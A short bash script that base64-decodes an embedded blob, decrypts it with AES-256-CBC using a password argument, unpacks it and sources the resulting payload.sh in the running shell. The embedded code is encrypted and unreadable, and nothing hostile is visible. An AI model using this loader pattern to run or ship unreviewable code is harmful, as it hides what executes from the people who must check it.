#!/usr/bin/env bash
set -eu

run_payload() {
  if ! command -v openssl >/dev/null 2>&1; then
    echo "payload: openssl not found in PATH." >&2
    exit 2
  fi

  if ! command -v tar >/dev/null 2>&1; then
    echo "payload: tar not found in PATH." >&2
    exit 2
  fi

  if ! command -v base64 >/dev/null 2>&1; then
    echo "payload: base64 not found in PATH." >&2
    exit 2
  fi

  base64_decode() {
    if base64 -d </dev/null >/dev/null 2>&1; then
      base64 -d
    else
      base64 -D
    fi
  }

  if [ "$#" -lt 1 ]; then
    echo "payload: password required as first argument." >&2
    exit 2
  fi
  password="$1"

  tmp_dir="$(mktemp -d)"
  trap 'rm -rf "$tmp_dir"' EXIT

  if ! printf '%s' "$PAYLOAD" | base64_decode \
      | openssl enc -d -aes-256-cbc -pbkdf2 -salt -pass "pass:$password" 2>/dev/null \
      | tar -xzf - -C "$tmp_dir"; then
    echo "payload: invalid password or corrupted payload." >&2
    exit 1
  fi

  source "$tmp_dir/$PAYLOAD_NAME"
}

PAYLOAD_NAME="payload.sh"

PAYLOAD='U2FsdGVkX1+hgdTRNTQt+PY7ZYQsKTzucmQ/QslE877zmI+AtuWPU7Wh6gm2Xcz4srEPFVhBs2SmR5JV5/qD0sJQDnrS51d9UYIXkItyHSHhwdwUf7O1TKIu2rfAcNBKMNhwSHe1eRYFDPtuP/HyPX46M8GpJ3u/MgAR0X3jSitDP7c5Xbphtrvkj9+aM79QZXn0TLw/mdkylbUZcjOTISjlXMRsivG8rbmT8XyAQX8Jn+E6RjRpA+9LxNBmwE1/EoZpCquMK1DD/6tMKydc4NSDo8h8KeWl5QfDGEOvZnouzCOnhGiCIOdozwNgTpeIEe/ZfgoVdeUn7MIVZ/BuWCsLhhSxNm3b3+jQBNfUQIfLPhuWNBBGMFh8yo6BInGyMVBLRw607/lpWqNrAo/BEraZLlyiW6noU/Snk4TcwA/+DkMsL9SAoqfJD1EKaQa+5PWtxixfnlNUCJiZoR03I1ME9lrDVx/zhXIVoYErK8+tBOnjVWLMpH5OJyZWSonNR2Bq21/Vn6PO+PInJ0qdLSOuWEFmJiYuLw/umYUWqUijZfJR+OTo13jg8l2uFYJkWXYrMPSO/T7TZyLdljpz2yA/Qh17gcn7TkkwU3NPQrT9jh72P6aPORID/PrlrE1pktnxNIZedHb80ZYzEca2WLjlrR+wSuuZ/phfYw4WVNoNIulQ+yB+vCa2K4WYiGc4ofm5uTMOq+PtDbyU3Kxoxb3nyAaoVqk65zjytNWQTSECyLInY54t6jcO5r4S/TSnSBsuP6uMypzGPumNlh4axQPsgKN8ulLWfFS6h7IPEebMUxhn0Zbkt20M/JjEO4KdphYBxXm//D7NmqkmBupn5oLqKmtDEfCQDveB5sQSncM+uB+cNMvQubqDVOJeRbJtbmBhFbRPMAYZVHUha3bHNM/lq+p2xNt0LLjNQraSqF0RJTzpKLWzneTh9wk+NF21AUKcJinjuGu9gRJLy3PNUuHImvlxHt0ZaEuplDt8+AA1zWv0v+0HQ4M2yHIW4fL0FLustNt4l/lHsi+nFguzkM5uG2thFHdphBunr4nl29fPtqonuZR7wcsAF1nBqKJhVvlxFJ7x7NY397WdrlWtym6LzzzDpJmaPikfvk4yeWckDLH8ih5rC/j3npVizIVAR+shTNart/Z+Bog8zMbt9hRmlu7vNmXi1Hy8UJh5FjGZx4CGHBuTEXL3zMDTUWnvRSVP/VtHUBJ+gu+tPguj94zVOUWVv9nfAZJ1m42VedgQHvU2Aqow+kjcI977kY68K4XfusIzfPckvuK2Jip7mYm6hc1e7F108UbiGdYvmmBfaY4D32hLa52NXsRcmxu5Uzbt7UwinGddeWAgll2n/thuS6xT87CWucsKrJ+T2NqKhfSYl1S1ZDtge3nd1Y/SsQvKXK4ThmDy9fMGHLn00Z/IQyuINI9f+LThK7AiV5OqbwTMmfkgLLTTVA/Nl2z2ySUgMCKJacfTgsflQUi/gQ=='

run_payload "$@"
